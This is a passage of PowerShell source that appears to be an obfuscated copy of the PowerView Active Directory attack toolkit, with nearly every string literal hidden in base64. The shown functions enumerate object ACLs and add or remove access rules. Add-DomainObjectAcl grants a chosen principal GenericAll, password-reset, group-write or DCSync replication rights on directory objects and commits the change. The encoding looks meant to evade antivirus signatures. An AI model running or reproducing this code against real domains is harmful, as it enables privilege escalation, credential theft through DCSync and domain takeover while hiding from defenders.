                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RBY2xdIEV4dHJhY3RlZCBkb21haW4gJyRJZGVudGl0eURvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2U=")))
                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityDomain
                        $Searcher = Get-DomainSearcher @SearcherArguments
                        if (-not $Searcher) {
                            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RBY2xdIFVuYWJsZSB0byByZXRyaWV2ZSBkb21haW4gc2VhcmNoZXIgZm9yICckSWRlbnRpdHlEb21haW4=")))
                        }
                    }
                }
                elseif ($IdentityInstance -imatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlswLTlBLUZdezh9LShbMC05QS1GXXs0fS0pezN9WzAtOUEtRl17MTJ9JA==")))) {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))) + $_.ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WDI=")))) }) -join ''
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKQ==")))
                }
                elseif ($IdentityInstance.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg=="))))) {
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwoc2FtQWNjb3VudE5hbWU9JElkZW50aXR5SW5zdGFuY2UpKG5hbWU9JElkZW50aXR5SW5zdGFuY2UpKGRuc2hvc3RuYW1lPSRJZGVudGl0eUluc3RhbmNlKSk=")))
                }
                else {
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwoc2FtQWNjb3VudE5hbWU9JElkZW50aXR5SW5zdGFuY2UpKG5hbWU9JElkZW50aXR5SW5zdGFuY2UpKGRpc3BsYXluYW1lPSRJZGVudGl0eUluc3RhbmNlKSk=")))
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwkSWRlbnRpdHlGaWx0ZXIp")))
            }

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RBY2xdIFVzaW5nIGFkZGl0aW9uYWwgTERBUCBmaWx0ZXI6ICRMREFQRmlsdGVy")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JExEQVBGaWx0ZXI=")))
            }

            if ($Filter) {
                $Searcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYkRmlsdGVyKQ==")))
            }
            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RBY2xdIEdldC1Eb21haW5PYmplY3RBY2wgZmlsdGVyIHN0cmluZzogezB9"))) -f $($Searcher.filter))

            $Results = $Searcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $Object = $_.Properties

                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $ObjectSid = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $ObjectSid = $Null
                }

                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bnRzZWN1cml0eWRlc2NyaXB0b3I=")))][0], 0 | ForEach-Object { if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2FjbA==")))]) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmlnaHRzRmlsdGVy")))]) {
                            $GuidFilter = Switch ($RightsFilter) {
                                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzZXRQYXNzd29yZA=="))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MDAyOTk1NzAtMjQ2ZC0xMWQwLWE3NjgtMDBhYTAwNmUwNTI5"))) }
                                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVNZW1iZXJz"))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YmY5Njc5YzAtMGRlNi0xMWQwLWEyODUtMDBhYTAwMzA0OWUy"))) }
                                Default { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAw"))) }
                            }
                            if ($_.ObjectType -eq $GuidFilter) {
                                $_ | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0RE4="))) $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0U0lE"))) $ObjectSid
                                $Continue = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0RE4="))) $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0U0lE"))) $ObjectSid
                            $Continue = $True
                        }

                        if ($Continue) {
                            $_ | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWN0aXZlRGlyZWN0b3J5UmlnaHRz"))) ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {
                                
                                $AclProperties = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0VHlwZXxJbmhlcml0ZWRPYmplY3RUeXBlfE9iamVjdEFjZVR5cGV8SW5oZXJpdGVkT2JqZWN0QWNlVHlwZQ==")))) {
                                        try {
                                            $AclProperties[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $AclProperties[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $AclProperties[$_.Name] = $_.Value
                                    }
                                }
                                $OutObject = New-Object -TypeName PSObject -Property $AclProperties
                                $OutObject.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkFDTA=="))))
                                $OutObject
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkFDTA=="))))
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RBY2xdIEVycm9yOiB7MH0="))) -f $_)
                }
            }
        }
    }
}


function Add-DomainObjectAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $TargetIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxs"))),

        [Guid]
        $RightsGUID
    )

    BEGIN {
        $TargetSearcherArguments = @{
            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWU=")))
            'Raw' = $True
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0RG9tYWlu")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $TargetDomain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0TERBUEZpbHRlcg==")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $TargetLDAPFilter }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0U2VhcmNoQmFzZQ==")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $TargetSearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        $PrincipalSearcherArguments = @{
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk="))) = $PrincipalIdentity
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWUsb2JqZWN0c2lk")))
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJpbmNpcGFsRG9tYWlu")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $PrincipalDomain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
        $Principals = Get-DomainObject @PrincipalSearcherArguments
        if (-not $Principals) {
            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5hYmxlIHRvIHJlc29sdmUgcHJpbmNpcGFsOiAkUHJpbmNpcGFsSWRlbnRpdHk=")))
        }
    }

    PROCESS {
        $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $TargetIdentity
        $Targets = Get-DomainObject @TargetSearcherArguments

        ForEach ($TargetObject in $Targets) {

            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9uZQ==")))
            $ControlType = [System.Security.AccessControl.AccessControlType] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsb3c=")))
            $ACEs = @()

            if ($RightsGUID) {
                $GUIDs = @($RightsGUID)
            }
            else {
                $GUIDs = Switch ($Rights) {
                    
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzZXRQYXNzd29yZA=="))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MDAyOTk1NzAtMjQ2ZC0xMWQwLWE3NjgtMDBhYTAwNmUwNTI5"))) }
                    
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVNZW1iZXJz"))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YmY5Njc5YzAtMGRlNi0xMWQwLWEyODUtMDBhYTAwMzA0OWUy"))) }
                    
                    
                    
                    
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RENTeW5j"))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MTEzMWY2YWEtOWMwNy0xMWQxLWY3OWYtMDBjMDRmYzJkY2Qy"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MTEzMWY2YWQtOWMwNy0xMWQxLWY3OWYtMDBjMDRmYzJkY2Qy"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ODllOTViNzYtNDQ0ZC00YzYyLTk5MWEtMGZhY2JlZGE2NDBj")))}
                }
            }

            ForEach ($PrincipalObject in $Principals) {
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0FkZC1Eb21haW5PYmplY3RBY2xdIEdyYW50aW5nIHByaW5jaXBhbCB7MH0gJyRSaWdodHMnIG9uIHsxfQ=="))) -f $($PrincipalObject.distinguishedname), $($TargetObject.Properties.distinguishedname))

                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NewGUID = New-Object Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXh0ZW5kZWRSaWdodA==")))
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                        }
                    }
                    else {
                        
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2VuZXJpY0FsbA==")))
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                    }

                    
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0FkZC1Eb21haW5PYmplY3RBY2xdIEdyYW50aW5nIHByaW5jaXBhbCB7MH0gcmlnaHRzIEdVSUQgJ3sxfScgb24gezJ9"))) -f $($PrincipalObject.distinguishedname), $($ACE.ObjectType), $($TargetObject.Properties.distinguishedname))
                        $TargetEntry = $TargetObject.GetDirectoryEntry()
                        $TargetEntry.PsBase.Options.SecurityMasks = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGFjbA==")))
                        $TargetEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
                        $TargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0FkZC1Eb21haW5PYmplY3RBY2xdIEVycm9yIGdyYW50aW5nIHByaW5jaXBhbCB7MH0gJyRSaWdodHMnIG9uIHsxfSA6IHsyfQ=="))) -f $($PrincipalObject.distinguishedname), $($TargetObject.Properties.distinguishedname), $_)
                }
            }
        }
    }
}


function Remove-DomainObjectAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $TargetIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxs"))),

        [Guid]
        $RightsGUID
    )

    BEGIN {
        $TargetSearcherArguments = @{
            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWU=")))
            'Raw' = $True
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0RG9tYWlu")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $TargetDomain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0TERBUEZpbHRlcg==")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $TargetLDAPFilter }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0U2VhcmNoQmFzZQ==")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $TargetSearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        $PrincipalSearcherArguments = @{
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk="))) = $PrincipalIdentity
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWUsb2JqZWN0c2lk")))
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJpbmNpcGFsRG9tYWlu")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $PrincipalDomain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
        $Principals = Get-DomainObject @PrincipalSearcherArguments
        if (-not $Principals) {
            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5hYmxlIHRvIHJlc29sdmUgcHJpbmNpcGFsOiAkUHJpbmNpcGFsSWRlbnRpdHk=")))
        }
    }

    PROCESS {
        $TargetSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $TargetIdentity
        $Targets = Get-DomainObject @TargetSearcherArguments

        ForEach ($TargetObject in $Targets) {

            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9uZQ==")))
            $ControlType = [System.Security.AccessControl.AccessControlType] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsb3c=")))
            $ACEs = @()

            if ($RightsGUID) {
                $GUIDs = @($RightsGUID)
            }
            else {
                $GUIDs = Switch ($Rights) {
                    
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzZXRQYXNzd29yZA=="))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MDAyOTk1NzAtMjQ2ZC0xMWQwLWE3NjgtMDBhYTAwNmUwNTI5"))) }
                    
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVNZW1iZXJz"))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YmY5Njc5YzAtMGRlNi0xMWQwLWEyODUtMDBhYTAwMzA0OWUy"))) }
                    
                    
                    
                    
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RENTeW5j"))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MTEzMWY2YWEtOWMwNy0xMWQxLWY3OWYtMDBjMDRmYzJkY2Qy"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MTEzMWY2YWQtOWMwNy0xMWQxLWY3OWYtMDBjMDRmYzJkY2Qy"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ODllOTViNzYtNDQ0ZC00YzYyLTk5MWEtMGZhY2JlZGE2NDBj")))}
                }
            }

            ForEach ($PrincipalObject in $Principals) {
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1JlbW92ZS1Eb21haW5PYmplY3RBY2xdIFJlbW92aW5nIHByaW5jaXBhbCB7MH0gJyRSaWdodHMnIGZyb20gezF9"))) -f $($PrincipalObject.distinguishedname), $($TargetObject.Properties.distinguishedname))

                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NewGUID = New-Object Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXh0ZW5kZWRSaWdodA==")))
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                        }
                    }
                    else {
                        
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2VuZXJpY0FsbA==")))
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                    }

                    
                    ForEach ($ACE in $ACEs) {
